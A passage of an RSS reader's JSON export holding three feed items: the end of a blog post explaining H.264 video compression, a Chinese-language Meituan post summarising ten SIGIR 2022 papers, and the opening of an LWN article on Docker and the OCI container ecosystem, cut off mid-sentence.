signal, R+G+B color data gets transformed to Y+Cb+Cr. The Y is the luminance (essentially black and white brightness) and the Cb and Cr are the chrominance (color) components. RGB and YCbCr are equivalent in terms of information entropy.</p>\n<blockquote>\n<p>Why unnecessarily complicate? RGB not good enough for you?</p>\n</blockquote>\n<p>Back before we had color TV, we only had the Y signal. And when color TVs just started coming along, engineers had to figure out a way to transmit RGB color along with Y. Instead of using two separate data streams, they wisely decided to encode the color information into Cb and Cr and transmit that along with the Y information. That way, BW TVs would only look at the Y component. Color TVs will, in addition, look at the chrominance components and convert to RGB internally.</p>\n<p>But check out the trick: the Y component gets encoded at full resolution. The C components only at a quarter resolution. Since the eye/brain is terrible at detecting color variations, you can get away with this. By doing this, you reduce total bandwidth by one half, with very little visual difference. Half! Your car now weighs 30 lbs!</p>\n<p>This process of discarding some of the color information is called <strong>Chroma Subsampling</strong>[^4]. While not specific to H.264 and has been around for decades itself, it is used almost universally.</p>\n<p>Those are the big weight shedders for lossy compression. Our frames are now tiny - since we discarded most of the detail information and half of the color information.</p>\n<blockquote>\n<p>Wait. That's it? Can we do something more?</p>\n</blockquote>\n<p>Yes. Weight shedding is only the first step. So far we're only looking at the spatial domains within a single frame. Now it's time to explore temporal compression - where we look at a group of frames across time.</p>\n<h6>Motion compensation</h6>\n<p>H.264 is a motion compensation compression standard.</p>\n<blockquote>\n<p>Motion compensation? What now?</p>\n</blockquote>\n<p>Imagine you're watching a tennis match. The camera is fixed at a certain angle. The only thing moving is the ball back and forth. How would you encode this information? You do what you always do, right? You have a 3D array of pixels, two dimensions in space and one in time. Right?</p>\n<p>Nah. Why would you? Most of the image is the same anyway. The court, the net, the crowds, all are static. The only real action is the ball moving. What if you could just have one static image of everything in the background, and then one moving image of just the ball? Wouldn't that save a lot of space? You see where I am going with this? Get it? See where I am going? Motion estimation?</p>\n<p>Lame jokes aside, this is exactly what H.264 does. H.264 splits up the image into macro-blocks - typically 16x16 pixel blocks that it will use for motion estimation. It encodes one static image - typically called an <strong>I-frame</strong>(Intra frame). This is a full frame - containing all the bits it required to construct that frame. And then subsequent frames are either <strong>P-frames</strong>(predicted) or <strong>B-frames</strong>(bi-directionally predicted). P-frames are frames that will encode a motion vector for each of the macro-blocks from the previous frame. So a P-frame has to be constructed by the decoder based on previous frames. It starts with the last I-frame in the video stream and then walks through every subsequent frame - adding up the motion vector deltas as it goes along until it arrives at the current frame.</p>\n<p>B-frames are even more interesting, where the prediction happens bi-directionally, both from past frames and from future frames. So you can imagine now why that Apple home page video is so well compressed. Because it's really just three I-frames in which the macro blocks are being panned around.</p>\n<p>Let's say you've been playing a video on YouTube. You missed the last few seconds of dialog, so you scrub back a few seconds. Have you noticed that it doesn't instantly start playing from that timecode you just selected. It pauses for a few moments and then plays. It's already buffered those frames from the network, since you just played it, so why that pause?</p>\n<blockquote>\n<p>Yeah that annoys the shit out of me. Why does it do that?</p>\n</blockquote>\n<p>Because you've asked the decoder to jump to some arbitrary frame, the decoder has to redo all the calculations - starting from the nearest I-frames and adding up the motion vector deltas to the frame you're on - and this is computationally expensive, and hence the brief pause. Hopefully you'll be less annoyed now, knowing it's actually doing hard work and not just sitting around just to annoy you.</p>\n<p>Since you're only encoding motion vectors deltas, this technique is extremely space-efficient for any video with motion, at the cost of some computation.</p>\n<p>Now we've covered both spatial and temporal compression! So far we have a shitton of space saved in Quantization. Chroma subsampling further halved the space required. On top of that, we have motion compensation that stores only 3 actual frames for the ~300 that we had in that video.</p>\n<blockquote>\n<p>Looks pretty good to me. Now what?</p>\n</blockquote>\n<p>Now we wrap up and seal the deal. We use a traditional lossless entropy encoder. Because why not? Let's just slap that on there for good measure.</p>\n<h6>Entropy Coder</h6>\n<p>The I-frames, after the lossy steps, contain redundant information. The motion vectors for each of the macro blocks in the P and B-frames - there are entire groups of them with the same values - since several macro blocks move by the same amount when the image pans in our test video.</p>\n<p>An entropy encoder will take care of this redundancy. And since it is a general purpose lossless encoder, we don't have to worry about what tradeoffs it's making. We can recover all the data that goes in.</p>\n<p>And, we're done! At the core of it, this is how video compression codecs like H.264 work. These are its tricks.</p>\n<blockquote>\n<p>Ok great! But I am curious to know how much our car weighs now.</p>\n</blockquote>\n<p>The original video was captured at an odd resolution of 1232x1154. If we apply the math here, we get:</p>\n<p>5 secs @ 60 fps = 1232x1154x60x3x5 =&gt; <strong>1.2 GB</strong><br>\nCompressed video =&gt; <strong>175 KB</strong></p>\n<p>If we apply the same ratio to our 3000 lb car, we get <strong>0.4 lbs</strong> as the final weight. 6.5 ounces!</p>\n<p><strong>Yeah. It's magic!</strong></p>\n<p>Obviously, I am massively oversimplifying several decades of intense research in this field. If you want to know more, the <a href=\"https://en.wikipedia.org/wiki/H.264/MPEG-4_AVC\">Wikipedia Page</a> is pretty descriptive.</p>\n<p>Have comments? Did I get something wrong? Not a fan of the lame jokes? Offended by the swearing? Use <a href=\"https://news.ycombinator.com/item?id=12871403\"><strong>HackerNews</strong></a> or <a href=\"https://www.reddit.com/r/programming/comments/5b31gt/h264_is_magic/\"><strong>Reddit</strong></a> for voicing your opinion!</p>\n<p>Or hit me up on <a href=\"https://twitter.com/SidBaIa\"><strong>Twitter</strong></a> or <a href=\"https://www.linkedin.com/in/sidbalasubramanian\"><strong>LinkedIn</strong></a> if you want to chat.</p>\n<p>[^1]<a href=\"http://www.anandtech.com/show/8747/samsung-ssd-850-evo-review/8\">SSD Benchmarks</a></p>\n<p>[^2]<a href=\"https://en.wikipedia.org/wiki/Nyquist%E2%80%93Shannon_sampling_theorem\">Nyquist-Shannon Sampling Theorem</a></p>\n<p>[^3][Quantization](<a href=\"https://en.wikipedia.org/wiki/Quantization_(signal_processing)\">https://en.wikipedia.org/wiki/Quantization_(signal_processing)</a></p>\n<p>[^4]<a href=\"https://en.wikipedia.org/wiki/Chroma_subsampling\">Chroma Subsampling</a></p>\n"
    },
    "origin": {
        "streamId": 29,
        "title": "Sid Bala",
        "htmlUrl": "https://sidbala.com/",
        "feedUrl": "https://sidbala.com/rss/"
    }
},
{
    "id": "https://tech.meituan.com/2022/07/21/acm-sigir-2022-meituan.html",
    "timestampUsec": "1658742212092893",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "ACM SIGIR 2022 | 美团技术团队精选论文解读",
    "author": ";美团技术团队",
    "published": 1658361600,
    "updated": 1658361600,
    "alternate": [
        {
            "href": "https://tech.meituan.com/2022/07/21/acm-sigir-2022-meituan.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>SIGIR是信息检索方向的国际顶级会议（CCF-A类）。第 45 届国际信息检索大会（The 45th International ACM SIGIR Conference on Research and Development in Information Retrieval，SIGIR 2022）已于上周（2022年7月11-15日）在西班牙马德里举行，同时也支持线上参会。本次会议共收到 794 篇长文投稿，其中 161 篇长文被录用，录用率约 20%；共收到 667 篇短文投稿，其中 165 篇短文被录用，录用率约 24.7%。</p><p>今年美团技术团队有多篇论文被ACM SIGIR 2022收录，这些论文涵盖了观点标签生成、跨域情感分类、对话摘要领域迁移、跨域检索、点击率预估、对话主题分割等多个技术领域。本文将精选10篇论文做简要的介绍（附下载链接），希望能对从事相关研究的同学有所帮助或启发。</p><p><img src=\"https://p0.meituan.net/travelcube/4e1b90a56cec4593bac9a5119d6d74673825821.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文01：Personalized Abstractive Opinion Tagging</h2><p><strong>|下载地址</strong>：<a href=\"https://dl.acm.org/doi/pdf/10.1145/3477495.3532037\">https://dl.acm.org/doi/pdf</a>（Full Paper）</p><p><strong>| 论文作者</strong>：赵梦雪（美团），杨扬（美团），李淼（美团），王金刚（美团），武威（美团），任鹏杰（山东大学），Maarten de Rijke（阿姆斯特丹大学），任昭春（山东大学）\n<strong>| 论文简介</strong>：观点标签是一组总结用户对产品或服务感受的短文本序列，通常由针对产品特定方面的一组短句组成。相较于推荐理由、方面标签、产品关键词等自然语言文本，观点标签能兼顾信息的完整性和关键信息的顺序性问题。关键词描述了该商户的基本信息，推荐理由可看作该商户下真实用户评论的高度浓缩，而观点标签“肉质很新鲜”则更完整地表达了当前用户对于该商户的“食材新鲜”方面的关键信息。</p><p>现有观点标签的标签顺序，只反映了基于统计信息的大众偏好，忽略了不同用户的个性化偏好。本文提出一种个性化的观点标签生成框架POT。基于产品评论提取产品关键信息，并通过用户评论和用户行为追踪用户的显式和隐式偏好，以确定关键信息的顺序，从而保证产品信息依据用户的感兴趣程度排列。我们设计了一个基于评论的层次异构图联合建模了用户、产品、方面标签和评论中的词，通过节点间深层次的信息交互，挖掘用户和产品之间的潜在关系，缓解了评论的稀疏性问题。同时，我们基于用户对产品的点击、收藏和购买行为构建了多类行为图，通过探索用户之间的相似关系进一步增强用户偏好表示。我们针对评论数据和行为数据的不同特点设计了不同的去噪模块以保证用户偏好表示的准确性。我们构建了基于大众点评真实数据的个性化观点标签数据集PATag，并在生成指标和排序指标中取得了良好的效果。此论文为NLP CIKM 2020论文《<a href=\"https://dl.acm.org/doi/10.1145/3340531.3412740\">Query-aware Tip Generation for Vertical Search</a>》的后续工作。</p><p><img src=\"https://p0.meituan.net/travelcube/4a00ad6b2773938096957308f0a067f2501108.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文02：Graph Adaptive Semantic Transfer for Cross-domain Sentiment Classification</h2><p><strong>| 下载地址</strong>：<a href=\"https://arxiv.org/pdf/2205.08772.pdf\">https://arxiv.org/pdf</a>（Full Paper）</p><p><strong>| 论文作者</strong>：张凯（美团），刘淇（中国科学技术大学），黄振亚（中国科学技术大学），张梦迪（美团），张琨（合肥工业大学），程明月（中国科学技术大学），武威，陈恩红（中国科学技术大学）</p><p><strong>| 论文简介</strong>：跨域情感分类（CDSC）旨在使用从源域中学习到的可迁移语义信息来预测未标记目标域中评论的情感极性。目前针对该任务的研究更多地关注句子层面的序列建模，很大程度上忽略了嵌入在图结构中的丰富的域不变语义信息（即词性标签和依赖关系）。作为探索与理解语言理解特征的一个重要方面，自适应图表示学习近年来发挥了至关重要的作用，尤其是在许多基于图表征模型的传统NLP任务中。例如在细粒度的情感分析（ABSA）任务中，利用图结构中的句法信息来增强Aspect的语义表示已经成为SOTA模型的基本配置。</p><p>在本论文中，我们旨在探索从CDSC中的类图结构中学习不变语义特征的可能性。我们提出了图自适应语义迁移（Graph Adaptive Semantic Transfer, GAST）模型，这是一种自适应句法图嵌入表征方法，能够从单词序列和句法图中学习域不变语义。具体地说，我们首先设计了一个POS-Transformer模块来从单词序列以及词性标签中提取序列化的语义特征；然后，我们设计了一个混合图注意（Hybrid-GAT）模块，通过考虑可迁移、域共享的图依赖关系来生成基于句法的通用语义特征；最后，我们设计了一个集成的自适应优化策略（Integrated aDaptive Strategy, IDS）来指导两个模块的联合学习过程。在四个公共数据集上进行的广泛实验证明，GAST的有效性优于一系列最先进的模型。</p><p><img src=\"https://p1.meituan.net/travelcube/27d25bcd158ab86e8cd450bfbad00e54445427.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文03：ADPL: Adversarial Prompt-based Domain Adaptation for Dialogue Summarization with Knowledge Disentanglement</h2><p><strong>| 下载地址</strong>：<a href=\"https://dl.acm.org/doi/pdf/10.1145/3477495.3531933\">https://dl.acm.org/doi/pdf</a>（Full Paper）</p><p><strong>| 论文作者</strong>：赵璐璐（北京邮电大学），郑馥嘉（北京邮电大学），曾伟豪（北京邮电大学），何可清，耿若彤（北京邮电大学），江会星（美团），武威（美团），徐蔚然（北京邮电大学）</p><p><strong>| 论文简介</strong>：领域自适应是机器学习中的一个基本任务。在本文中，我们研究对话摘要任务中的领域迁移问题，试图借助源域的有标注数据迁移到无标注或少标注的目标域，进而提升低资源目标域下对话摘要的生成效果，可用于解决实际场景中小业务数据匮乏的挑战。传统的对话摘要领域迁移方法往往依赖于大规模领域语料，借助于预训练来学习领域间知识。该方法的缺点是实际语料收集难，对算力要求高，针对每一个目标域都需要进行耗时的预训练过程，效率低。</p><p>本文从微调的角度出发，提出了一种轻量级的解耦知识迁移方法ADPL，无需大规模的预训练过程，仅仅利用源域数据和少量的无标注目标域数据，即可实现高质量的对话摘要生成。具体来说，我们基于Prompt Learning的思想，针对对话摘要任务中的领域迁移问题，提出了三种特定的prompt结构：Domain-Invariant Prompt (DIP)、Domain-Specific Prompt (DSP)和Task-Oriented Prompt (TOP)，其中DIP用来捕获领域间的共享特征，DSP用来建模领域特有知识，TOP用来促进生成流畅的摘要。在训练中，我们仅仅更新这些Prompt相关的参数就可以实现领域间知识的解耦和迁移，相比较之前的预训练方法，训练高效环保，对机器的显存要求显著降低。同时，我们基于两个大规模的对话摘要数据集QMSum和TODSum构建了对话摘要领域迁移评测集，在两个评测集上取得了一致的最优效果，实验结果和消融分析都证明了本文提出方法的有效性。</p><p><img src=\"https://p0.meituan.net/travelcube/d2f06a14f24824f0f42d51eb3da68799144346.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文04：Structure-Aware Semantic-Aligned Network for Universal Cross-Domain Retrieval</h2><p><strong>| 下载地址</strong>：<a href=\"https://dl.acm.org/doi/pdf/10.1145/3477495.3532061\">https://dl.acm.org/doi/pdf</a>（Full Paper）</p><p><strong>| 论文作者</strong>：田加林（美团）， 徐行（电子科技大学），王凯（电子科技大学），曹佐（美团），蔡勋梁（美团），申恒涛（电子科技大学）</p><p><strong>| 论文简介</strong>：跨域检索（Cross-Domain Retrieval，CDR）旨在实现基于内容的多域图像表征对齐和检索；当域间差异过大时，也称之为跨模态检索。传统的CDR方法只考虑训练和测试数据来源于相同的域和相同类。然而，实际应用场景中测试样本常来自于未见类，或者未见域，又或者两者皆是。卷积神经网络已经成为CDR任务主流，然而，由于卷积操作的内在局部性，CNN在对物体的全局结构信息进行建模时受到明显的制约。</p><p>基于上述问题，我们提出通用跨域检索（Universal Cross-Domain Retrieval, UCDR），其测试数据可以来源于未见类、未见域或者两者结合，方法中我们使用基于Vision Transformer（ViT）的结构感知语义对齐网络，利用ViT的能力来建模物体的全局结构信息。具体而言，我们将自监督预训练的ViT模型和微调模型整合到一个框架下，通过对齐软标签防止微调模型遗忘全局结构信息，提升微调模型泛化性；通过可学习的类原型在超球空间对齐多域表征，提升微调模型的判别性。实验结果表明，我们的方法在跨域检索任务上远超现有算法，成功实现跨域表征对齐和模型泛化性。</p><p><img src=\"https://p1.meituan.net/travelcube/f17ed30e7abcd1479ab2669dfeabd05c589112.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文05：Multimodal Disentanglement Variational Autoencoders for Zero-Shot Cross-Modal Retrieval（Full Paper）</h2><p><strong>| 下载地址</strong>：<a href=\"https://dl.acm.org/doi/pdf/10.1145/3477495.3532028\">https://dl.acm.org/doi/pdf</a></p><p><strong>| 论文作者</strong>：田加林（美团），王凯（电子科技大学），徐行（电子科技大学），曹佐（美团），沈复民（电子科技大学），申恒涛（电子科技大学）</p><p><strong>| 论文简介</strong>：测试集由未见类组成是零样本跨模态检索（Zero-Shot Cross-Modal Retrieval，ZS-CMR）关注的一个实际的检索场景。现有方法通常采用生成模型作为主要框架，学习联合潜在嵌入空间表征以缓解模态差异。一般来说，这些方法主要依靠额外的语义嵌入实现跨类的知识迁移，并且不自觉地忽略了生成模型中数据重建方式的影响。</p><p>基于上述问题，我们提出一个称为多模态解耦变分自编码器（MDVAE）的ZS-CMR模型，它由两个特定于模态的解耦变分自编码器（DVAE）和一个融合交换自动编码器（FVAE）组成。具体来说，DVAE把每种模态的原始表征分解为模态不变特征和特定于模态的特征。FVAE通过重构和对齐过程来融合和交换多模态数据的信息，而无需额外的语义嵌入。此外，我们还提出了一个新颖的反直觉交叉重构方案，以提高模态不变量特征的信息量和通用性，从而实现更有效的知识迁移。提出的方法在图像-文本和图像-草图检索任务中取得明显性能提升，建立了新的SOTA结果。</p><p><img src=\"https://p1.meituan.net/travelcube/3648ae5c5fb6cdbe01d639a42a860b8b484787.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文06：Co-clustering Interactions via Attentive Hypergraph Neural Network</h2><p><strong>| 下载地址</strong>：<a href=\"https://dl.acm.org/doi/pdf/10.1145/3477495.3531868\">https://dl.acm.org/doi/pdf</a>（Full Paper）</p><p><strong>| 论文作者</strong>：杨天持（北京邮电大学），杨成（北京邮电大学），张路浩（美团），石川（北京邮电大学），胡懋地（美团），刘怀军（美团），李滔（美团），王栋（美团）</p><p><strong>| 论文简介</strong>：随着如电商平台中的用户-商家/商品的点击或者购买等交互数据的快速增多，人们提出了许多聚类方法用于发现交互模式，例如在外卖场景中的“白领经常在下午购买咖啡以提升工作效率”，从而作为先验知识来帮助下游任务。考虑到交互可以被视为多个对象之间发生的一个动作，大多数现有方法将对象及其成对关系建模为图中的节点和边。然而，他们只对实际的完整交互中的部分信息进行了建模和利用，即要么将一个完整交互分解成若干个成对的子交互以进行简化，要么只专注于对某些特定类型的对象进行聚类，这限制了聚类的性能和解释性。</p><p>在本文中，针对这一问题，我们提出通过注意力超图神经网络对交互进行协同聚类（CIAH）。具体来说，在通过超图对交互进行更全面的建模（包括用户属性、商家属性、菜品属性、时空属性等）后，我们提出一个注意力超图神经网络来编码完整交互，其中使用注意机制来选择重要的属性以作为聚类结果的解释。然后，我们引入了一种显著性方法来指导注意力机制的学习，以使其与属性的真实重要性更加一致，称为基于显著性的一致性。此外，我们还提出了一种新颖的协同聚类方法来对交互的表示和相应的属性选择分布进行协同聚类，称为基于聚类的一致性。实验表明CIAH在公开数据集和美团数据集上均显著优于最先进的聚类方法。</p><p><img src=\"https://p0.meituan.net/travelcube/64f0d51b1f4a89951906e82322b53bed334880.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文07：DisenCTR: Dynamic Graph-based Disentangled Representation for Click-Through Rate Prediction</h2><p><strong>| 下载地址</strong>：<a href=\"https://dl.acm.org/doi/pdf/10.1145/3477495.3531851\">https://dl.acm.org/doi/pdf</a>（Short Paper）</p><p><strong>| 论文作者</strong>：王一帆（北京大学），覃义方（美团），孙昉（美团），张博（美团），侯旭阳（美团），胡可（美团），程佳（美团），雷军（美团），张铭（北京大学）</p><p><strong>| 论文简介</strong>：点击率（CTR）预估在推荐系统、搜索广告等下游业务中有着重要的应用。现有工作常常通过用户行为序列刻画用户兴趣，却未能捕捉用户实时兴趣的多样性（Diversity）和流动性（Fluidity）。为了更加准确地刻画用户实时兴趣，提升CTR预估质量，该论文提出了基于动态图的解耦合表示框架DisenCTR，对用户不断变化的多兴趣进行建模。DisenCTR在动态时序U-I子图上通过动态路由机制提取用户多兴趣的解耦合表示（Disentangled Representation），并使用混合霍克斯过程（Mixture of Hawkes Process）模拟用户历史行为中的自激效应。该模型在公开数据集和美团私有数据集上均取得了显著的性能提升。</p><p><img src=\"https://p0.meituan.net/travelcube/5888994701ded7adbe8409f691418423141712.jpg\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文08：Hybrid CNN Based Attention with Category Prior for User Image Behavior Modeling</h2><p><strong>| 下载地址</strong>：<a href=\"https://arxiv.org/pdf/2205.02711.pdf\">https://arxiv.org/pdf</a>（Short Paper）</p><p><strong>| 论文作者</strong>：陈鑫（美团），唐庆涛（美团），胡可（美团），徐越（美团），邱世航（香港科技大学），程佳（美团），雷军（美团）</p><p><strong>| 论文简介</strong>：在推荐广告场景中，每个POI会展示其对应的图片，展示的图片通常会影响用户是否点击这个POI，这意味着建模用户对图片的偏好有助于CTR建模。业界对图片建模大多数停留在POI侧，较少关注用户侧图片行为序列的建模。目前现有的用户创意图片行为序列模型通常使用Two-Stage的模型结构，即在第一阶段通过现成的CNN网络提取创意图片的Embedding，第二阶段使用图片Embedding和CTR模型联合训练，这种两阶段架构对于CTR建模是次优的，除此之外现有的CNN缺乏场景属性相关的类别先验，会导致CNN提取场景任务无关的特征，从而限制了CNN的表达能力。</p><p>为此，在本文中我们设计了一种Fixed-CNN和Trainable-CNN混合的Hybrid CNN结构(HCCM)，来建模用户图像行为序列。文章主要贡献：1）通过ImageNet预训练的参数初始化浅层CNN，固定浅层CNN参数的同时将深层CNN与CTR模型联合训练。2）设计了将候选图片和用户对图片的偏好相结合的图片语意Attention机制，为提升CNN在推荐广告CTR任务上的特征提取能力，HCCM将图片和图片的类别先验在Feature Map维度通过Channel Attention的方式提取类目体系相关特征。相关技术方案在到店推荐广告的所有场景（包括首页信息流推荐、商户详情页推荐和团单详情页推荐等）均取得了显著效果。</p><p><img src=\"https://p1.meituan.net/travelcube/d5d33e9fdd6dea5d50866dec184a4df9268466.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文09：Dialogue Topic Segmentation via Parallel Extraction Network with Neighbor Smoothing</h2><p><strong>| 下载地址</strong>：<a href=\"https://dl.acm.org/doi/pdf/10.1145/3477495.3531817\">https://dl.acm.org/doi/pdf</a>（Short Paper）</p><p><strong>| 论文作者</strong>：夏今雄（美团），刘操（美团），陈见耸（美团），李宇琛（美团），杨帆（美团），蔡勋梁（美团），万广鲁（美团），王厚峰（北京大学）</p><p><strong>| 论文简介</strong>：对话主题分割需要将对话分割成具有预定义主题的片段。现有的主题切分研究采用两阶段范式，包括文本切分和片段标注。然而，这些方法在分割时往往侧重于局部上下文，并且没有很好地捕捉到片段间的依赖关系。此外，对话段边界的模糊性和标签噪声对现有模型提出了进一步的挑战。</p><p>为此，我们提出了基于邻域平滑的并行抽取网络 (PEN-NS) 来解决上述问题。具体来说，我们提出了并行抽取网络来执行片段提取，优化片段的二分匹配代价以捕获片段间的依赖关系。此外，我们还提出了邻域平滑来处理数据噪声和边界模糊。在基于对话和基于文档的主题分割数据集上的实验表明，PEN-NS的性能显著优于现有的模型。</p><p><img src=\"https://p0.meituan.net/travelcube/91b6fadacc06f73b8c8c33345ae37b68680442.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文10：Deep Page-Level Interest Network in Reinforcement Learning for Ads Allocation</h2><p><strong>| 下载地址</strong>：<a href=\"https://dl.acm.org/doi/pdf/10.1145/3477495.3531847\">https://dl.acm.org/doi/pdf</a>（Short Paper）</p><p><strong>| 论文作者</strong>：廖国钢（美团），石晓文（美团），王泽（美团），吴晓旭（美团），张楚珩（美团实习生），王永康（美团），王兴星（美团），王栋（美团）</p><p><strong>| 论文简介</strong>：在Feed流场景下，用户在页面的行为模式受页面展示多个物品影响，单点兴趣无法建模页面内多物品的竞争关系，难以利用更丰富的请求级用户行为信息（如下刷，流失等），无法充分提取用户复杂的页面级决策模式。因此，如何利用用户的请求级行为信息，建模列表物品的竞争关系和相互影响，在重排、混排、预估等场景均有极大业务价值，是一个非常有意义也极具挑战性的问题。业界主流用户兴趣建模框架侧重通过单物品行为序列来刻画用户的兴趣，主要有三方面局限性：一是单物品序列忽略了列表中物品竞争关系；二是点击下单等单物品行为忽略了用户的页面级行为信息，对于用户行为刻画不完整；三是忽略用户感受野差异，不同用户对页面中不同区域物品的关注度有较大差异。</p><p><img src=\"https://p0.meituan.net/travelcube/785214e08d92fe5ed24d45de9035f168253193.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><p>针对以上挑战，本文设计了基于强化学习框架的页面级深度兴趣网络框架（DPIN），利用用户的列表粒度行为信息，刻画列表广告与广告、广告与自然结果的竞争关系和相互影响，建模用户在浏览页面时复杂的决策行为模式。具体有四方面：一是基于用户历史行为构造Page-Level序列，设计页面内自注意力层对页面内竞争关系进行建模；二是在点击下单行为的基础上，增加下刷、流失屏等页面级负反馈、隐式反馈信息，并对隐式反馈信息去噪；三是设计不同卷积核对页面的局部视野信息进行抽取，得到多个通道的Page-Level信息，建模考虑用户感受野差异；四是设计Page-Level行为匹配层，对不同通道的用户历史行为序列和当前候选序列进行整体匹配建模，提升广告分配决策效率。本文的技术方案在美团外卖场景取得了显著效果，并完成线上大规模落地。此论文为WWW 2022论文《Cross DQN: Cross Deep Q Network for Ads Allocation in Feed》的后续工作。</p><h2>写在后面</h2><p>以上这些论文是美团技术团队与各高校、科研机构通力合作的成果。本文主要介绍了我们在观点标签、跨域情感分类、领域自适应、跨域检索、点击率预估、对话主题分割等技术领域做的一些科研工作。希望能对大家有所帮助或启发，也欢迎大家跟我们进行交流。</p><h2>美团科研合作</h2><p>美团科研合作致力于搭建美团技术团队与高校、科研机构、智库的合作桥梁和平台，依托美团丰富的业务场景、数据资源和真实的产业问题，开放创新，汇聚向上的力量，围绕机器人、人工智能、大数据、物联网、无人驾驶、运筹优化等领域，共同探索前沿科技和产业焦点宏观问题，促进产学研合作交流和成果转化，推动优秀人才培养。面向未来，我们期待能与更多高校和科研院所的老师和同学们进行合作。欢迎老师和同学们发送邮件至：meituan.oi@meituan.com。</p>"
    },
    "origin": {
        "streamId": 13,
        "title": "美团技术团队",
        "htmlUrl": "https://tech.meituan.com/feed/",
        "feedUrl": "https://rsshub.black-desk.cn/meituan/tech/home"
    }
},
{
    "id": "902049",
    "timestampUsec": "1658855585919014",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Docker and the OCI container ecosystem",
    "author": ";jake",
    "published": 1658854920,
    "updated": 1658854920,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/902049/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           <p>July 26, 2022</p>\n           <p>This article was contributed by Jordan Webb</p>\n           </div>\n<p><a href=\"https://www.docker.com/\">Docker</a> has transformed the way\nmany people develop and deploy software.  It wasn't the first\nimplementation of containers on Linux, but Docker's ideas about how\ncontainers should be structured and managed were different from its\npredecessors.  Those ideas matured into industry standards, and an\necosystem of software has grown around them.  Docker continues to be a\nmajor player in the ecosystem, but it is no longer the only whale in the\nsea — Red Hat has also done a lot of work on\ncontainer tools, and alternative implementations are\nnow available for many of Docker's offerings.  </p>\n\n<h4>Anatomy of a container</h4>\n\n<p>A container is somewhat like a lightweight virtual machine; it shares a\nkernel with the host, but in most other ways it appears to be an\nindependent machine to the software running inside of it.  The Linux kernel\nitself has no concept of containers; instead, they are created by using\na combination of several kernel features: </p>\n\n<ul>\n\n<li> <a href=\"https://docs.docker.com/storage/bind-mounts/\">Bind mounts</a> and <a href=\"https://www.kernel.org/doc/html/latest/filesystems/overlayfs.html\">overlayfs</a>\nmay be used to \nconstruct the root filesystem of the container.</li>\n\n<li> <a href=\"https://man7.org/linux/man-pages/man7/cgroups.7.html\">Control\ngroups</a> may be used to partition CPU, memory, and I/O resources for  the\nhost kernel.</li> \n\n<li> <a href=\"https://lwn.net/Articles/531114/\">Namespaces</a> are used to\ncreate an isolated view of the system for processes running inside the\ncontainer.</li>\n\n</ul>\n\n<p>Linux's namespaces are the key feature that allow the creation of\ncontainers.  Linux supports namespaces for multiple different aspects of\nthe system, including user namespaces for separate views of user and group\nIDs, PID namespaces for distinct sets of process IDs, network namespaces\nfor distinct sets of network interfaces, and several others.  When a\ncontainer is started, a runtime creates the appropriate control groups,\nnamespaces, and filesystem mounts for the container; then it launches a\nprocess inside the environment it has created.  </p>\n\n<p>There is some level of disagreement about what that process should be.\nSome prefer to start an init process like systemd and run a full Linux system inside\nthe container.  This is referred to as a \"system container\";  it was the\nmost common type of container before Docker. System containers\ncontinue to be supported by software like <a href=\"https://linuxcontainers.org/lxc/introduction/\">LXC</a> and <a href=\"https://openvz.org/\">OpenVZ</a>.  </p>\n\n<p>Docker's developers had a different idea.  Instead of running an entire\nsystem inside a container, Docker says that each\ncontainer <a href=\"https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#decouple-applications\">should only run a single application</a>.  This style of\ncontainer is known as an \"application container.\"  An application container\nis started using a container image, which bundles the application together\nwith its dependencies and just enough of a Linux root filesystem to run it.\n</p>\n\n<p>\nA container image generally does not include an init system, and may not\neven include a package manager — container images are usually replaced with\nupdated versions rather than updated in place.  An image for\na statically-compiled application may be as <a href=\"https://github.com/GoogleContainerTools/distroless\">minimal</a> as a single binary\nand a handful of support files in <tt>/etc</tt>.  \nApplication\ncontainers usually don't have a persistent root filesystem; instead,\noverlayfs is used to create a temporary layer on top of the container\nimage.  This is thrown away when the container is stopped.  Any persistent\ndata outside of the container image is grafted on to the container's\nfilesystem via a bind mount to another location on the host.  </p>\n\n<h4>The OCI ecosystem</h4>\n\n<p>These days, when people talk about containers, they are likely to be\ntalking about the style of application containers popularized by Docker.\nIn fact, unless otherwise specified, they are probably talking about the\nspecific container image format, run-time environment, and registry API\nimplemented by Docker's software. Those have all been standardized by the <a href=\"https://opencontainers.org/\">Open Container Initiative</a> (OCI), which\nis an industry body that was formed in 2015 by Docker\nand the Linux\nFoundation.  Docker refactored its\nsoftware into a number of smaller components; some of those components,\nalong with their specifications, were placed\nunder the care of the OCI.  The software and specifications published by\nthe OCI formed the seed for what is now a robust ecosystem of\ncontainer-related software.  </p>\n\n<p>The <a href=\"https://github.com/opencontainers/image-spec/blob/main/spec.md\">OCI\nimage specification</a> defines a format for container images that\nconsists of a JSON configuration (containing environment variables, the\npath to execute, and so on) and a series of tarballs called \"layers\".  The\ncontents of each layer are stacked on top of each other,\nin series, to construct the root filesystem for the container\nimage.  Layers can be shared between images; if a server is running several\ncontainers that refer to the same layer, they can potentially share the\nsame copy of that layer.  Docker provides minimal images for several\npopular Linux distributions that can be used as the base layer for\napplication containers.  </p>\n\n<p>The OCI also publishes a <a href=\"https://github.com/opencontainers/distribution-spec/blob/main/spec.md\">distribution\nspecification</a>.  In this context, \"distribution\" does not refer to a\nLinux distribution; it is used a more general sense.  This specification\ndefines an HTTP API for pushing and pulling container images to and from a\nserver; servers that implement this API are called container registries.\nDocker maintains a large public registry called <a href=\"https://hub.docker.com/\">Docker Hub</a> as well as a <a href=\"https://github.com/distribution/distribution\">reference\nimplementation</a> (called \"Distribution\", perhaps confusingly) that can be 